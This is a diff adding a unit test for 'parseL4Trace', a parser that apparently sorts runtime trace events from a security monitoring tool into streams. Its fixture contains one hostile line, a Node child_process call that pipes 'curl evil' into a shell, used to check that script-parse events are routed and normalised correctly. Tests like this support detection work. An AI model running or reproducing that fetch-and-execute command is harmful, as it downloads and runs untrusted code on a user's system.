@@ -61,6 +61,22 @@ describe("parseL4Trace", () => {
     expect(events!.map((e) => e.timestamp)).toEqual([0, 1]);
   });
 
+  it("routes a `script` entry to the L4:v8inspector stream with its decoded source", () => {
+    const events = parseL4Trace(wrap([
+      { type: "require", module: "fs" },
+      { type: "script", url: "", source: "require('child_process').exec('curl evil | sh')", len: 4210 },
+    ]));
+    const script = events!.find((e) => e.kind === "script_parsed")!;
+    expect(script.stream).toBe("L4:v8inspector");
+    expect(script.normalized).toEqual({
+      url: "",
+      source: "require('child_process').exec('curl evil | sh')",
+      len: 4210, // true length carried through (may exceed the captured source when capped)
+    });
+    // the monkey-patch entry stays on its own stream
+    expect(events!.find((e) => e.kind === "require")!.stream).toBe("L4:monkey");
+  });
+
   it("normalizes network URL + method", () => {
     const events = parseL4Trace(wrap([
       { type: "network", method: "GET", url: "https://api.example.com/data" },
